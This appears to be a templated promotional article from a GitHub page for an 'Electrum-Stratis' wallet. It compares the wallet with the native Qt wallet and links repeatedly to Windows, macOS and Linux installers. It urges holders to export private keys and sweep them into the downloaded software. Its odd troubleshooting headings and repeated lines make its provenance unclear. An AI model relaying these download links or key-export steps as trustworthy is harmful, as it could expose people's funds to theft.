![Electrum-Stratis](assets/banner-article.png)

# Why not just use the native wallet?

<p align="center">Two designs, two backup models</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

You can keep using the native Qt wallet: it serves the same legacy chain as Electrum Stratis, so neither holds coins the other cannot see. The difference is operational: the native wallet is a full node with individually stored keys, while Electrum Stratis is a seed-based wallet that syncs in minutes and restores from a phrase. Most holders move to the second for the backup model, not because the first stopped working. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Your priority | Native Qt wallet | Electrum Stratis |
|---|---|---|
| Full validation, no servers | Yes - it is a full node | No - it queries servers |
| Fast start on a laptop | No - full chain download | Yes - headers and history |
| One-phrase backup | No - keys stored individually | Yes - the seed is the wallet |
| Multisig and watch-only | No | Yes |
| Cold staking | Limited | Supported |
| Same chain, same coins | Yes | Yes |

</div>

Neither column is a defect. They are two designs answering different questions, and the honest recommendation depends on which question you are asking: whether you want to verify the chain yourself, or whether you want a wallet you can rebuild from a sentence written on paper.

## Why it happens

A full node validates everything itself. That independence costs disk, bandwidth and time, and it produces a wallet whose keys were generated one at a time into a file. A light wallet trusts servers for chain data but keeps keys locally, which is faster and adds a backup primitive the full node never had.

The backup difference is the one that changes outcomes. A wallet file can be copied and encrypted, but it cannot be written on paper and retyped a decade later. A seed can. That is why the migration path runs from key to seed rather than the other way, and why the Qt bridge exists at all.

For daily use the maintained build is the practical choice, and its current release is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19); the native wallet remains the reference implementation.

## Fix

1. **Decide what you are optimising.** If you want to validate the chain yourself, run the native wallet. If you want a wallet you can back up on paper and restore on another machine, use this one.
2. **Keep the native wallet if it already works.** There is no forced migration; a synced node with keys is a functioning wallet, and moving coins costs fees.
3. **Migrate when backup is the concern.** Export keys from the native wallet and sweep them here, one address at a time, until the old balance is empty.
4. **Run both during the transition.** The native wallet can stay as the reference while the new one holds the spendable balance; two wallets are not a conflict.
5. **Do not run two wallets on one file.** Copying a wallet file between installations, or opening the same file from two applications, is how keys get confused rather than moved.

The migration is one-way in practice: a seed wallet can be recreated anywhere, a key-store wallet cannot be recreated from a phrase. The other cost is disk. A full node keeps the chain on your machine and re-verifies it, which is the point of running one, while a light wallet keeps headers and the history of its own addresses and leaves the rest to servers ([the three Electrum Stratis backups](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md), and [is Electrum Stratis still maintained](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/is-the-wallet-still-maintained.md)).

## If that did not work

If the native wallet will not sync, its balance is unavailable but its keys are not lost - the file still holds them, and the export route works once the node can see the chain.

If you migrated and the old wallet still shows a balance, an address was missed. Export and sweep the remainder rather than assuming the first pass was complete.

If you prefer the native wallet but want a paper backup, there is no phrase to write. The workable substitute is a backed-up, encrypted wallet file plus a written record of its password, which is a weaker but real backup.

## Prevention

- Pick the wallet by backup model first, features second.
- Keep the old wallet file until every address is empty.
- Never open one wallet file from two applications.
- Record which addresses have been migrated.
- Re-check the old balance after a migration, not just the new one.
- Keep the old wallet file until every address is empty, even after the new wallet works.

## FAQ

### Should I use the native wallet or Electrum Stratis?

Use this wallet if you want a seed you can write down, fast sync and multisig; keep the native wallet if you want to validate the chain yourself. Both hold the same legacy coins, and moving between them is a key export, not a conversion.

### Is the native wallet still usable?

Yes. It is the reference implementation for the legacy chain and continues to work for holders who run it. The reason to migrate is convenience and backup, not because the native wallet stopped functioning.

### Can I have both installed?

Yes, and during a migration you probably should. They read different files and can coexist; what you must not do is point both at the same wallet file or copy it between installations while one is running.

### Does moving to Electrum Stratis change my coins?

No. Same chain, same asset, same addresses until you sweep. A sweep moves the balance to addresses derived from your seed, which is a transaction with a fee, not a conversion.

<!-- DOWNLOAD-BLOCK -->

If you still run it, migrate in an order that keeps both copies usable: export one key, sweep it to a seed-backed address, wait for confirmation, then repeat. Do not abandon the native wallet until every address it controls is empty, and write down the ones you have cleared. A half-migrated wallet is the state in which coins get left behind.

## Related articles

- [The Qt wallet does not work with a seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/qt-wallet-has-no-seed.md)
- [Coins sent to Core, and what the balance is waiting for](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/coins-sent-to-core-wallet.md)
- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
- [What Electrum Stratis actually is](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/what-this-wallet-is.md)
